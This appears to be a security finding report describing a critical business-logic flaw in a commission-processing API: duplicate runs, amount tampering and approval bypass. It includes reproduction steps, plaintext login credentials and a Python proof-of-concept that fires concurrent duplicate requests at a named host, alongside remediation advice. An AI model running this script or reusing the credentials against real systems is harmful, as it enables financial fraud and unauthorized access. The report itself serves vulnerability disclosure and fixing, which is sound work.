# Commission Run Workflow Bypass Enables Multiple Runs and Amount Manipulation

**ID:** vuln-0019
**Severity:** CRITICAL
**Found:** 2026-02-26 16:55:45 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/GetCommissionRunDetails
**Method:** GET
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission run functionality that allows attackers to execute multiple commission runs for the same period, manipulate commission amounts through parameter tampering, and bypass approval workflows.

The vulnerability exists in the CommissionRun controller endpoints, specifically in the RunCommission and GetCommissionRunDetails actions. The application fails to properly validate commission run uniqueness, enforce approval workflows, and prevent parameter tampering.

An attacker with Organization-level access can:
1. Execute multiple commission runs for the same time period
2. Manipulate commission amounts through parameter tampering
3. Bypass approval workflows for commission processing
4. Exploit concurrency issues to inflate commission calculations

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Financial Fraud**: Execute multiple commission runs for the same period, resulting in duplicate payouts
2. **Commission Inflation**: Manipulate commission amounts through parameter tampering
3. **Approval Bypass**: Process commission runs without proper approval
4. **Concurrency Exploitation**: Exploit race conditions to inflate commission calculations
5. **Financial Reporting Manipulation**: Create inaccurate financial records through duplicate runs

The financial impact can be severe, potentially resulting in significant monetary losses through duplicate commission payouts and inflated commission amounts.

## Technical Analysis

The vulnerability exists due to insufficient validation and controls in the commission run processing:

1. **Missing Uniqueness Validation**: The application does not validate that commission runs are unique for a given time period
2. **Insufficient Approval Workflow**: Approval workflows can be bypassed by manipulating request parameters
3. **Parameter Tampering Vulnerability**: Commission amounts can be manipulated through request parameter modification
4. **Concurrency Issues**: Race conditions exist in commission calculation processing
5. **State Management Flaws**: Commission run state transitions are not properly enforced

The CommissionRun controller endpoints accept JSON payloads that are directly processed without proper validation of uniqueness, approval status, or parameter integrity.

## Proof of Concept

**Reproduction Steps for Multiple Commission Runs:**

1. Authenticate as an Organization user (nlnarayana3858@gmail.com / User@1234)
2. Navigate to the Run Commission interface
3. Select a time period and initiate a commission run
4. Intercept the RunCommission API request using a proxy
5. Note the request parameters including the time period
6. Submit the same RunCommission request again with identical parameters
7. Observe that a second commission run is created for the same period
8. Verify that both commission runs result in payout calculations

**Reproduction Steps for Commission Amount Manipulation:**

1. Authenticate as an Organization user
2. Initiate a commission run for a specific period
3. Intercept the GetCommissionRunDetails request
4. Modify the commission amount values in the response
5. Submit the modified commission run details
6. Observe that the manipulated amounts are accepted
7. Verify that payouts are calculated based on the manipulated amounts

```
import requests
import json
import time
import concurrent.futures

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
RUN_COMMISSION_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Organization user credentials
CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

# Step 1: Authenticate and get JWT token
auth_response = requests.post(AUTH_ENDPOINT, json=CREDENTIALS)
auth_data = auth_response.json()
jwt_token = auth_data['id_token']

headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

# Step 2: Execute multiple commission runs for the same period
def execute_commission_run(run_number):
    """Execute a commission run with the same parameters"""
    commission_run_payload = {
        "runName": f"Exploit Run {run_number}",
        "runDescription": "Duplicate commission run for exploitation",
        "startDate": "2024-01-01T00:00:00Z",
        "endDate": "2024-01-31T23:59:59Z",
        "orgId": "current_org_id",  # Would be replaced with actual org ID
        "clientId": None,
        "status": "Completed"
    }

    response = requests.post(RUN_COMMISSION_ENDPOINT, headers=headers, json=commission_run_payload)
    return response.status_code, response.json()

# Step 3: Execute multiple runs concurrently
print("Executing multiple commission runs for the same period...")
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(execute_commission_run, i) for i in range(1, 6)]
    results = [future.result() for future in concurrent.futures.as_completed(futures)]

# Step 4: Verify multiple runs were created
successful_runs = sum(1 for status, _ in results if status == 200)
print(f"\nSUCCESS: {successful_runs} commission runs created for the same period")
print("This allows the attacker to generate duplicate commission payouts")
print("\nRun results:")
for i, (status, data) in enumerate(results, 1):
    print(f"Run {i}: Status {status} - {data.get('message', 'No message')}")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Commission Run Uniqueness Validation**:
   - Add validation to ensure only one commission run can be executed per time period
   - Implement database constraints to prevent duplicate runs
   - Add uniqueness checks in the business logic layer

2. **Enforce Approval Workflows**:
   - Implement mandatory approval processes for commission runs
   - Add status validation to prevent unauthorized state transitions
   - Require explicit approval before commission processing

3. **Prevent Parameter Tampering**:
   - Implement request signature validation
   - Store commission run parameters immutably
   - Validate commission amounts against expected ranges

4. **Fix Concurrency Issues**:
   - Implement proper locking mechanisms for commission processing
   - Add transaction isolation for commission calculations
   - Implement idempotency keys for commission run requests

5. **Improve State Management**:
   - Enforce proper state transitions for commission runs
   - Add validation to prevent unauthorized status changes
   - Implement comprehensive status tracking

**Long-Term Recommendations:**

1. Implement a comprehensive commission processing workflow with multiple approval steps
2. Add financial controls to detect and prevent duplicate commission runs
3. Implement change tracking for all commission run modifications
4. Conduct regular audits of commission processing
5. Implement monitoring and alerting for suspicious commission activity

